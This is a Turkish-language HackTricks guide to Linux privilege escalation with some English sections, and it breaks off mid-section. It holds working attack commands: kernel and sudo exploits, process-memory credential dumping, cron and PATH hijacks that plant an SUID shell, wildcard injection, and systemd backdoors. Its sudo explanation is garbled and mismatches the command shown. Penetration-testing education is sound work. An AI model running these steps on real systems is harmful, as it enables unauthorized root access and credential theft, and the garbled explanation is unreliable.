# Linux Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Sistem Bilgisi

### İşletim Sistemi Bilgisi

Çalışan işletim sistemi hakkında bazı bilgiler edinmeye başlayalım.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Yol

Eğer `PATH` değişkeni içindeki herhangi bir klasöre **yazma izniniz varsa**, bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:

```bash
echo $PATH
```

### Çevre bilgisi

Çevre değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?

```bash
(env || set) 2>/dev/null
```

### Kernel Exploitleri

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit var mı diye kontrol edin.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

İyi bir zayıf çekirdek listesi ve bazı zaten derlenmiş **sömürüler** burada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Bazı **derlenmiş sömürüler** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm zayıf çekirdek sürümlerini çıkarmak için şunu yapabilirsiniz:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Kernel açıklarını aramak için kullanılabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (sadece kurban üzerinde çalıştırılmalıdır, yalnızca 2.x çekirdek sürümleri için açıkları kontrol eder)

Her zaman **Google'da çekirdek sürümünü arayın**, belki çekirdek sürümünüz bir çekirdek açığında geçiyordur ve bu açığın geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Yetki Yükseltme - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo sürümü

Aşağıdaki listeye, zayıf noktalara sahip sudo sürümlerine dayanarak:

```bash
searchsploit sudo
```

Sudo sürümünün güvenlik açığı olup olmadığını kontrol etmek için bu grep'i kullanabilirsiniz.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

#### sudo < v1.28

@sickrov tarafından

Bu zayıflık, sudo'nun 1.28 sürümünden önceki sürümlerinde bulunur. Bu sürümlerde, sudoers dosyasında yapılan değişikliklerin etkili olması için sudoers.d dizinindeki dosyaların yeniden yüklenmesi gerekmektedir. Ancak, sudoers.d dizinindeki dosyaların değiştirilebilir olduğu ve kötü niyetli bir saldırganın bu dizindeki bir dosyayı değiştirerek kötü amaçlı komutları çalıştırabileceği bir zayıflık vardır.

Bu zayıflığı kullanmak için, saldırgan sudoers.d dizinindeki bir dosyayı değiştirir ve ardından sudo komutunu çalıştırır. Bu, saldırganın kötü amaçlı komutları root yetkileriyle çalıştırmasına olanak tanır.

Bu zayıflığın önlenmesi için, sudo'nun en son sürümünü kullanmak ve sudoers.d dizinindeki dosyaların izinlerini sıkı bir şekilde kontrol etmek önemlidir.

```
sudo -u#-1 /bin/bash
```

### Dmesg imza doğrulaması başarısız oldu

Bu zafiyetin nasıl istismar edilebileceğine dair bir örnek için **HTB'nin smasher2 kutusunu** kontrol edin.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Daha fazla sistem taraması

Once you have gained initial access to a system, it is important to perform thorough enumeration to gather as much information as possible about the target system. This will help you identify potential vulnerabilities and avenues for privilege escalation.

#### User Enumeration

Start by enumerating the users on the system. This can be done by checking the contents of the `/etc/passwd` file, which contains information about all the users on the system. You can use the following command to view the contents of the file:

```bash
cat /etc/passwd
```

Pay attention to any users with administrative privileges, as they may be potential targets for privilege escalation.

#### Group Enumeration

Next, enumerate the groups on the system. The `/etc/group` file contains information about all the groups on the system. Use the following command to view the contents of the file:

```bash
cat /etc/group
```

Look for any groups that have elevated privileges or are associated with administrative users.

#### Process Enumeration

Enumerating the running processes on the system can provide valuable information about the system's configuration and potential vulnerabilities. Use the following command to list all running processes:

```bash
ps aux
```

Pay attention to any processes running with elevated privileges or owned by administrative users.

#### Service Enumeration

Identifying the services running on the system is crucial for understanding its functionality and potential attack vectors. Use the following command to list all active network services:

```bash
netstat -tuln
```

Look for any services that are running on privileged ports or are associated with administrative users.

#### File and Directory Enumeration

Enumerating the files and directories on the system can help you identify sensitive information or misconfigurations that may lead to privilege escalation. Use the following command to list the contents of the current directory:

```bash
ls -la
```

Explore different directories and pay attention to any files or directories with elevated permissions or owned by administrative users.

#### Network Enumeration

Finally, enumerate the network configuration of the system to identify potential attack vectors or misconfigurations. Use the following command to view the network interfaces and their configurations:

```bash
ifconfig -a
```

Pay attention to any interfaces that are connected to privileged networks or have misconfigured settings.

By performing thorough system enumeration, you can gather valuable information that will aid in the privilege escalation process. This information can help you identify potential vulnerabilities and devise an effective attack strategy.

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

### Olası savunmaları sıralayın

### AppArmor

AppArmor, Linux çekirdeği üzerinde çalışan bir güvenlik modülüdür. Uygulamaların ve süreçlerin erişebileceği kaynakları ve yetkileri sınırlamak için kullanılır. AppArmor, profil adı verilen yapılandırmaları kullanarak uygulamaların davranışını kontrol eder. Bu profil dosyaları, uygulamaların hangi dosyalara, ağ kaynaklarına ve diğer sistem kaynaklarına erişebileceğini belirler.

AppArmor, bir saldırganın bir uygulama veya süreç üzerindeki yetkilerini sınırlayarak, bir saldırının etkisini azaltabilir. Bu nedenle, bir hedef sistemde AppArmor etkinse, saldırganın yetki yükseltme saldırılarından kaçınmak için alternatif yöntemler araması gerekebilir.

```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```

### Grsecurity

Grsecurity, a patch for the Linux kernel, provides an additional layer of security by implementing various security enhancements. These enhancements include address space layout randomization (ASLR), which randomizes the memory layout of processes, making it difficult for attackers to predict memory addresses. Grsecurity also includes features like enhanced auditing, access control, and process restrictions.

To check if Grsecurity is installed on a system, you can use the following command:

```bash
uname -a
```

If Grsecurity is installed, you will see "grsec" or "grsecurity" in the output.

Grsecurity can help in preventing privilege escalation attacks by hardening the Linux kernel. It provides protection against common attack vectors and helps in mitigating the impact of vulnerabilities.

However, it is important to note that Grsecurity is not a silver bullet and should be used in conjunction with other security measures. Regularly updating the kernel and applying security patches is also crucial for maintaining a secure system.

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

PaX is a patch for the Linux kernel that provides various security features, including address space layout randomization (ASLR) and executable space protection (ESP). These features help protect against buffer overflow and code injection attacks. PaX can be used to harden the security of a Linux system by preventing the execution of malicious code and making it more difficult for attackers to exploit vulnerabilities.

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

Execshield, a Linux kernel feature, is designed to protect against certain types of memory-based attacks, such as buffer overflow attacks. It provides protection by randomizing the memory layout of executable programs, making it difficult for attackers to predict the location of vulnerable code or data.

Execshield can be enabled by setting the `kernel.exec-shield` parameter to a value of `1` in the `/etc/sysctl.conf` file. This can be done using the following command:

```bash
echo "kernel.exec-shield = 1" >> /etc/sysctl.conf
```

After making this change, you need to reload the sysctl settings using the following command:

```bash
sysctl -p
```

Once Execshield is enabled, it adds an additional layer of security to your system by making it harder for attackers to exploit memory vulnerabilities. However, it is important to note that Execshield is just one of many security measures that should be implemented to protect your system.

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

SElinux (Security-Enhanced Linux), Linux çekirdeği üzerinde çalışan bir güvenlik modülüdür. SElinux, Linux sistemindeki dosya ve işlemlerin erişim haklarını kontrol etmek için kullanılır. Bu, yetkilendirilmemiş erişimlerin engellenmesine ve potansiyel güvenlik açıklarının önlenmesine yardımcı olur.

SElinux, Linux sistemindeki varsayılan güvenlik politikalarını uygular. Bu politikalar, dosya ve dizinlerin hangi kullanıcıların erişebileceğini, hangi işlemlerin hangi kaynaklara erişebileceğini ve hangi ağ bağlantılarının izin verildiğini belirler. SElinux, bu politikaları uygulayarak, yetkilendirilmemiş erişim girişimlerini algılar ve engeller.

SElinux, Linux sistemindeki güvenlik açıklarını azaltmaya yardımcı olurken, aynı zamanda birçok avantaj da sağlar. Bunlar arasında ayrıcalıklı erişim gerektiren işlemlerin kontrolü, dosya ve dizinlerin bütünlüğünün korunması ve zararlı yazılımların yayılmasının engellenmesi bulunur.

SElinux, Linux sistemlerinde varsayılan olarak etkinleştirilmiş olabilir veya etkinleştirilmediyse manuel olarak etkinleştirilebilir. Etkinleştirildiğinde, SElinux, sisteminizin güvenliğini artırmak için önemli bir araç haline gelir. Ancak, SElinux bazen istenmeyen sonuçlara yol açabilir ve bazı uygulamaların düzgün çalışmasını engelleyebilir. Bu nedenle, SElinux'u etkinleştirmeden önce dikkatlice değerlendirmek önemlidir.

SElinux hakkında daha fazla bilgi edinmek ve nasıl yapılandırılacağını öğrenmek için Linux belgelerine ve kaynaklara başvurabilirsiniz.

```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```

ASLR (Address Space Layout Randomization) Linux çekirdeğinde bir güvenlik mekanizmasıdır. Bu mekanizma, saldırganların hedef sistemdeki bellek bölgelerini tahmin etmesini zorlaştırarak, saldırıların etkisini azaltmayı amaçlar.

ASLR, bellek bölgelerinin konumunu rastgele bir şekilde yerleştirerek çalışır. Bu sayede, saldırganlar hedef sistemdeki bellek bölgelerinin yerini tahmin etmekte zorlanır. Saldırganlar, hedef sistemdeki bellek bölgelerinin konumunu bilmedikleri için, saldırılarını gerçekleştirmek için daha fazla çaba harcamak zorunda kalır.

ASLR, saldırganların bellek sızıntılarından yararlanmasını da zorlaştırır. Bellek sızıntıları, saldırganlara hedef sistemdeki bellek bölgelerinin konumunu elde etme imkanı sağlar. Ancak ASLR, bellek bölgelerinin konumunu rastgele bir şekilde yerleştirerek, bellek sızıntılarının etkisini azaltır.

ASLR, Linux sistemlerinde varsayılan olarak etkinleştirilidir. Ancak, bazı durumlarda ASLR devre dışı bırakılmış olabilir. Bu nedenle, sistem yöneticilerinin ASLR'ın etkin olduğundan emin olmaları ve gerektiğinde etkinleştirmeleri önemlidir.

ASLR, Linux sistemlerindeki güvenlik açıklarının istismarını zorlaştıran etkili bir mekanizmadır. Sistem yöneticileri, ASLR'ın etkin olduğundan emin olmalı ve gerektiğinde etkinleştirmelidir.

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Docker Kaçışı

Eğer bir docker konteynerinin içindeyseniz, ondan kaçmaya çalışabilirsiniz:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Sürücüler

Hangi sürücülerin bağlandığını ve bağlanmadığını, nerede ve neden kontrol edin. Eğer bir şey bağlanmamışsa, onu bağlamayı deneyebilir ve özel bilgileri kontrol edebilirsiniz.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Kullanışlı yazılımlar

Yararlı ikili dosyaları sıralayın

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını kontrol edin**. Bu, bazı kernel saldırılarını kullanmanız gerektiğinde faydalıdır çünkü bunu kullanacağınız makinede (veya benzer bir makinede) derlemeyi önerilir.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Kurulu Yazılımlarda Güvenlik Açığı

**Yüklü paketlerin ve hizmetlerin sürümünü** kontrol edin. Belki de ayrıcalıkları yükseltmek için sömürülebilecek eski bir Nagios sürümü gibi bazı şüpheli yazılımlar vardır...\
Daha şüpheli olan kurulu yazılımların sürümünü manuel olarak kontrol etmek önerilir.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Makineye SSH erişiminiz varsa, makine içindeki güncellenmemiş ve savunmasız yazılımları kontrol etmek için **openVAS** kullanabilirsiniz.

{% hint style="info" %}
_Bu komutlar çoğunlukla gereksiz bilgileri gösterecektir, bu nedenle bilinen saldırılara karşı savunmasız olan herhangi bir yüklü yazılım sürümünü kontrol edecek OpenVAS veya benzeri uygulamalar önerilir_
{% endhint %}

## İşlemler

**Hangi işlemlerin** yürütüldüğüne bakın ve herhangi bir işlemin **beklenenden daha fazla yetkiye** sahip olup olmadığını kontrol edin (belki root tarafından yürütülen bir tomcat?).

```bash
ps aux
ps -ef
top -n 1
```

Her zaman [**electron/cef/chromium hata ayıklayıcılarının** çalışıp çalışmadığını kontrol edin, bu sayede ayrıcalıkları yükseltebilirsiniz](electron-cef-chromium-debugger-abuse.md). **Linpeas**, işlemin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder. Ayrıca, **işlem ikili dosyalarının ayrıcalıklarını kontrol edin**, belki de birinin üzerine yazabilirsiniz.

### İşlem izleme

[**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanarak işlemleri izleyebilirsiniz. Bu, sık sık yürütülen zayıf işlemleri veya belirli gereksinimlerin karşılandığı durumları tespit etmek için çok faydalı olabilir.

### İşlem belleği

Bir sunucunun bazı hizmetleri, **kimlik bilgilerini açık metin olarak belleğe kaydeder**.\
Genellikle, diğer kullanıcılara ait işlemlerin belleğini okumak için **kök ayrıcalıklarına** ihtiyacınız olacaktır, bu nedenle genellikle zaten kök kullanıcıysanız ve daha fazla kimlik bilgisi keşfetmek istiyorsanız daha faydalı olur.\
Ancak, **normal bir kullanıcı olarak sahip olduğunuz işlemlerin belleğini okuyabilirsiniz**.

{% hint style="warning" %}
Günümüzde çoğu makine, varsayılan olarak **ptrace izin vermez**, bu da ayrıcalıksız kullanıcınıza ait diğer işlemleri dökemeyeceğiniz anlamına gelir.

_Dosya_ **/proc/sys/kernel/yama/ptrace\_scope** \_ptrace'nin erişilebilirliğini kontrol eder:

* **kernel.yama.ptrace\_scope = 0**: aynı uid'ye sahip tüm işlemler hata ayıklanabilir. Bu, ptracing'in klasik çalışma şeklidir.
* **kernel.yama.ptrace\_scope = 1**: yalnızca bir üst işlem hata ayıklanabilir.
* **kernel.yama.ptrace\_scope = 2**: Yalnızca yönetici ptrace kullanabilir, çünkü CAP\_SYS\_PTRACE yeteneği gerektirir.
* **kernel.yama.ptrace\_scope = 3**: Hiçbir işlem ptrace ile izlenemez. Ayarlandıktan sonra, ptracing'i yeniden etkinleştirmek için bir yeniden başlatma gereklidir.
{% endhint %}

#### GDB

Bir FTP hizmetinin belleğine erişiminiz varsa (örneğin), Heap'e erişebilir ve içindeki kimlik bilgilerini arayabilirsiniz.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Komut Dosyası

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Bir verilen işlem kimliği için, **haritalar, belleğin o işlemin** sanal adres alanı içinde nasıl eşlendiğini gösterir; ayrıca, **her eşlenmiş bölgenin izinlerini** gösterir. **mem** sahte dosyası, **işlemin belleğini kendisi açığa çıkarır**. **Haritalar** dosyasından, hangi **bellek bölgelerinin okunabilir** olduğunu ve ofsetlerini biliriz. Bu bilgileri kullanarak, **mem dosyasına gidip okunabilir tüm bölgeleri bir dosyaya dökeriz**.

```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`, sistemdeki **fiziksel** belleğe erişim sağlar, sanal belleği değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` sadece **root** ve **kmem** grubu tarafından okunabilir.

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux için ProcDump

ProcDump, Windows'un Sysinternals araç takımının klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Araçlar

Bir işlem belleğini dökmek için şunları kullanabilirsiniz:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Kök gereksinimlerini manuel olarak kaldırabilir ve size ait olan işlemi dökme yapabilirsiniz
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) adresindeki Script A.5 (root gerektirir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer kimlik doğrulayıcı işlemi çalışıyorsa:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Prosesi dökümleyebilirsiniz (farklı yöntemler için önceki bölümlere bakın, bir işlemin belleğini dökmenin farklı yollarını bulmak için) ve bellekte kimlik bilgilerini arayabilirsiniz:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı, bellekten açık metin kimlik bilgilerini ve bazı **tanınmış dosyalardan** çalar. Doğru şekilde çalışabilmesi için kök ayrıcalıklarına ihtiyaç duyar.

| Özellik                                                | İşlem Adı            |
| ------------------------------------------------------ | -------------------- |
| GDM şifresi (Kali Masaüstü, Debian Masaüstü)           | gdm-password         |
| Gnome Keyring (Ubuntu Masaüstü, ArchLinux Masaüstü)    | gnome-keyring-daemon |
| LightDM (Ubuntu Masaüstü)                              | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                        | vsftpd               |
| Apache2 (Aktif HTTP Temel Kimlik Doğrulama Oturumları) | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zamanlanmış/Cron görevleri

Herhangi bir zamanlanmış görevin savunmasız olup olmadığını kontrol edin. Belki de root tarafından çalıştırılan bir betikten faydalanabilirsiniz (joker karakter açığı mı? root'un kullandığı dosyaları değiştirebilir mi? sembolik bağlantıları kullanabilir mi? root'un kullandığı dizine özel dosyalar oluşturabilir mi?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma yetkisi olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı bir komut veya betik çalıştırmaya çalışırken yol belirtmezse. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, aşağıdaki kullanarak root kabuğuna erişebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Script ile Joker karakter kullanarak Cron (Joker Enjeksiyonu)

Eğer bir script root tarafından çalıştırılıyorsa ve komut içinde "**\***" karakteri bulunuyorsa, bu durumu istenmeyen şeyler yapmak için (örneğin, ayrıcalık yükseltme) kullanabilirsiniz. Örnek:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Eğer joker karakteri bir yolun önünde kullanılıyorsa** _**/bazı/yol/\***_ **, bu zafiyete neden olmaz (hatta** _**./\***_ **bile olmaz).**

Daha fazla joker karakteri sömürüsü hilesi için aşağıdaki sayfayı okuyun:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron betiği üzerine yazma ve sembolik bağlantı

Eğer root tarafından çalıştırılan bir cron betiğini **değiştirebiliyorsanız**, çok kolay bir şekilde bir kabuk elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Eğer root tarafından çalıştırılan betik, tam erişime sahip olduğunuz bir **dizini kullanıyorsa**, o dizini silmek ve yerine senin kontrolünde olan bir betiği hizmet eden **bağlantı dizini oluşturmak** faydalı olabilir.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Sık kullanılan cron görevleri

Her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri aramak için süreçleri izleyebilirsiniz. Belki bundan faydalanarak ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izlemek**, **daha az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **kullanabilirsiniz** (bu, başlatılan her işlemi izleyen ve listeyi veren bir araçtır).

### Görünmez cron görevleri

Yorumdan sonra bir satır sonu karakteri olmadan bir satır sonu karakteri koyarak bir cron görevi oluşturmak mümkündür ve cron görevi çalışacaktır. Örnek (satır sonu karakterine dikkat edin):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasını yazabilir olup olmadığınızı kontrol edin, eğer yapabiliyorsanız, **onu değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durduğunda** arka kapınızı **çalıştırabilirsiniz** (belki makine yeniden başlatılana kadar beklemeniz gerekebilir).\
Örneğin, arka kapınızı .service dosyasının içine **`ExecStart=/tmp/script.sh`** şeklinde oluşturun.

### Yazılabilir hizmet ikili dosyaları

Unutmayın ki, eğer hizmetler tarafından **çalıştırılan ikili dosyalara yazma izniniz varsa**, onları arka kapılarla değiştirebilirsiniz, böylece hizmetler yeniden çalıştırıldığında arka kapılar da çalıştırılacaktır.

### systemd PATH - Göreceli Yollar

**systemd** tarafından kullanılan PATH'i aşağıdaki komutla görebilirsiniz:

```bash
systemctl show-environment
```

Eğer yolun herhangi bir klasörüne **yazma** yeteneğiniz olduğunu fark ederseniz, **yetki yükseltme** yapabilirsiniz. **Hizmet yapılandırmalarında kullanılan göreceli yolları** aramalısınız. Örnek olarak:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ardından, yazılabilir olduğunuz systemd PATH klasörü içinde, **göreceli yol ikili dosyasıyla aynı isme sahip bir çalıştırılabilir dosya** oluşturun ve servis, zafiyetli eylemi (**Başlat**, **Durdur**, **Yeniden Yükle**) gerçekleştirmesi istendiğinde, **arka kapınız çalıştırılacak** (genellikle yetkisiz kullanıcılar servisleri başlatamaz/durduramaz ancak `sudo -l` komutunu kullanabiliyorsanız kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Zamanlayıcılar**

**Zamanlayıcılar**, adı `**.timer**` ile biten `**.service**` dosyalarını veya olayları kontrol eden systemd birim dosyalarıdır. **Zamanlayıcılar**, takvim zamanı olayları ve monotonik zaman olayları için yerleşik destek içerdikleri için cron yerine kullanılabilir ve asenkron olarak çalıştırılabilirler.

Tüm zamanlayıcıları listeleyebilirsiniz:

```bash
systemctl list-timers --all
```

### Yazılabilir zamanlayıcılar

Bir zamanlayıcıyı değiştirebiliyorsanız, onu bir `.service` veya `.target` gibi mevcut bir systemd.unit'in çalıştırmasını sağlayabilirsiniz.

```bash
Unit=backdoor.service
```

Dökümantasyonda birim olanın ne olduğunu okuyabilirsiniz:

> Bu zamanlayıcı süresi dolduğunda etkinleştirilecek bir birimdir. Argüman, ".timer" olmayan bir birim adıdır. Belirtilmezse, bu değer, zamanlayıcı biriminin adı hariç aynı isme sahip bir hizmete varsayılan olarak ayarlanır. (Yukarıya bakınız.) Etkinleştirilen bir birimin adının ve zamanlayıcı biriminin bir birim adının, sonek hariç aynı şekilde adlandırılması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunlara ihtiyacınız olacaktır:

* Yazılabilir bir ikili dosya yürüten bir sistem birimi (örneğin `.service`)
* Göreceli bir yol yürüten bir sistem birimi bulun ve **sistem PATH** üzerinde **yazma izinleriniz** olsun (bu yürütülebilir dosyayı taklit etmek için)

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer`'a bakın.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için kök ayrıcalıklarına ihtiyacınız vardır ve şunu çalıştırmanız gerekmektedir:

